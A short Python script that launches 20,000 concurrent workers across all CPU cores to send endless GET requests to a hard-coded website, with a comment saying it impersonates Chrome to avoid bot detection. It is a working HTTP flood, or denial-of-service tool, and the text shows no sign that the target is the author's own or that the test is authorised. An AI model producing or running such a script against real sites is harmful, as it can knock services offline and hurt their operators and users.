import asyncio
import multiprocessing
from curl_cffi.requests import AsyncSession

link = "https://nazshalal.com"

async def worker(session):
    while True:
        try:
            # Using impersonate helps avoid basic bot detection
            response = await session.get(link, impersonate="chrome110")
            print(f"Core {multiprocessing.current_process().name}: {response.status_code}")
        except Exception:
            print("Could not get a response")
        await asyncio.sleep(0.01)

async def run_async_loop(users_per_core):
    """Starts an independent asyncio event loop for this specific CPU core."""
    async with AsyncSession() as session:
        workers = [worker(session) for _ in range(users_per_core)]
        await asyncio.gather(*workers)

def start_process(users_per_core):
    asyncio.run(run_async_loop(users_per_core))

if __name__ == "__main__":
    total_users = 20000
    num_cores = multiprocessing.cpu_count()
    print("The total numbber of CPU Cores is : ", num_cores)
    users_per_core = total_users // num_cores

    print(f"Launching {num_cores} processes, each handling {users_per_core} users...")

    processes = []
    for i in range(num_cores):
        p = multiprocessing.Process(target=start_process, args=(users_per_core,))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
